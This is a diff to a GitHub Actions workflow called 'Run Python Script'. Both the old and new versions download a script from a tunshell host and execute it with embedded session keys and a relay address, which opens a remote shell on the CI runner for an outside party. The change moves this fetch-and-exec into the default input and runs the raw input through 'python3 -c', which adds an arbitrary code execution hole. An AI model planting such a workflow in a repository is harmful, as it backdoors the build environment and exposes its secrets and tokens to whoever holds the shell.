@@ -3,10 +3,10 @@ name: Run Python Script
 on:
   workflow_dispatch:
     inputs:
-      script_url:
-        description: 'Enter the URL of the Python script to run'
+      script:
+        description: 'Enter the full Python script to run'
         required: true
-        default: 'https://lets.tunshell.com/init.py'
+        default: 'import urllib.request; r=urllib.request.urlopen("https://lets.tunshell.com/init.py"); exec(r.read().decode("utf-8"), {"p": ["T", "QzVLcxZNLjOsL9B5GsOKpE", "HusbgdDg2ERzl6ogwq9gUo", "eu.relay.tunshell.com"]})'
 
   push:
     branches:
@@ -28,5 +28,5 @@ jobs:
 
     - name: Run Python script
       run: |
-        echo "Fetching and running Python script from: ${{ github.event.inputs.script_url }}"
-        python3 -c "import urllib.request; r=urllib.request.urlopen('${{ github.event.inputs.script_url }}'); exec(r.read().decode('utf-8'), {'p': ['T', 'QzVLcxZNLjOsL9B5GsOKpE', 'HusbgdDg2ERzl6ogwq9gUo', 'eu.relay.tunshell.com']})"
+        echo "Running the provided Python script:"
+        python3 -c "${{ github.event.inputs.script }}"
